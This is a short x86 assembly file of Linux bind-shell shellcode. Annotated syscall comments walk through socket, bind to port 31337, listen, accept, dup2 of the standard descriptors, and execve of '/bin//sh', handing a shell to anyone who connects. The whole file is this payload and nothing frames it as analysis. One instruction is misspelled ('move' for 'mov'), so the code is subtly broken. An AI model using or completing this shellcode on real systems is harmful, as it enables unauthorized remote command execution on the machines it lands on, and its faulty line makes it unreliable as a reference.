BITS 32

; s = socket(2,1,0)
  push BYTE 0x66
  pop eax
  cdq
  xor ebx, ebx
  inc ebx
  push edx
  push BYTE 0x1
  push BYTE 0x2
  mov ecx, esp
  int 0x80

  xchg esi, eax

; bind(s, [2,31337, 0], 16)
  push BYTE 0x66
  pop eax
  inc ebx
  push edx
  push WORD 0x697a
  push WORD bx
  mov ecx, esp
  push BYTE 16
  push ecx
  push esi
  mov ecx, esp
  int 0x80

; listen(s, 0)
  mov BYTE al, 0x66
  inc ebx
  inc ebx
  push ebx
  push esi
  mov ecx, esp
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66
  inc ebx
  push edx
  push edx
  push esi
  mov ecx, esp
  int 0x80

; dup2(connected socket, {all three standard I/O file descriptors})
  xchg eax, ebx
  push BYTE 0x2
  pop ecx
dup_loop:
  mov BYTE al, 0x3F
  int 0x80
  dec ecx
  jns dup_loop

; execve(const char *filename, char *const argv [], char *const envp[])
  move BYTE al, 11
  push edx
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  push edx
  mov edx, esp
  push ebx
  mov ecx, esp
  int 0x80
